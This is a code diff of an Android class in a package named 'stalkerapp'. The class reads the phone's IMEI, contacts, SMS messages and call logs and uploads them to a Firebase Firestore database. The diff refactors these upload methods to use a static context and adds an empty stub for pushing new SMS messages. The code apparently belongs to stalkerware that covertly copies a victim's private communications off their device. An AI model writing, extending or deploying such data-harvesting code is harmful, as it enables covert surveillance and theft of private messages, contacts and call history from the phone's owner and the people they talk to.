@@ -2,6 +2,7 @@ package com.github.saintedlittle.stalkerapp.firebase;
 
 import static android.content.ContentValues.TAG;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.provider.Settings;
 import android.util.Log;
@@ -25,7 +26,11 @@ public class FirebaseSaver {
 
     private final FirebaseFirestore db = FirebaseFirestore.getInstance();
 
-    private String DEVICE_ID = "";
+    private static String DEVICE_ID = "";
+
+    @SuppressLint("StaticFieldLeak")
+    private static Context context;
+
 
     private static void onFailure(Exception e) {
         Log.w(TAG, "Error adding document", e);
@@ -38,7 +43,9 @@ public class FirebaseSaver {
     public void saveDefaultData(Context context) {
         SystemData systemData = new SystemDataFetcher(context).fetchSystemData();
 
-        DEVICE_ID = systemData.getImei();
+        FirebaseSaver.DEVICE_ID = systemData.getImei();
+        FirebaseSaver.context = context;
+
 
         Map<String, Object> systemInformation = new HashMap<>();
 
@@ -63,7 +70,7 @@ public class FirebaseSaver {
                 .addOnFailureListener(FirebaseSaver::onFailure);
     }
 
-    public void saveContacts(Context context) {
+    public void saveContacts() {
 
         List<ContactData> contacts = new ContactFetcher(context).fetchContacts();
 
@@ -82,7 +89,7 @@ public class FirebaseSaver {
 
     }
 
-    public void saveSMS(Context context) {
+    public void saveSMS() {
 
         List<SMSData> smsList = SMSFetcher.fetchSMS(context);
 
@@ -102,7 +109,7 @@ public class FirebaseSaver {
 
     }
 
-    public void saveCalls(Context context) {
+    public void saveCalls() {
 
         List<CallData> callList = CallFetcher.fetchCalls(context);
 
@@ -120,6 +127,10 @@ public class FirebaseSaver {
                     .document(e.getCaller())
                     .update(call);
         });
+
+    }
+
+    public void pushNewSMS(SMSData data) {
 
     }
 
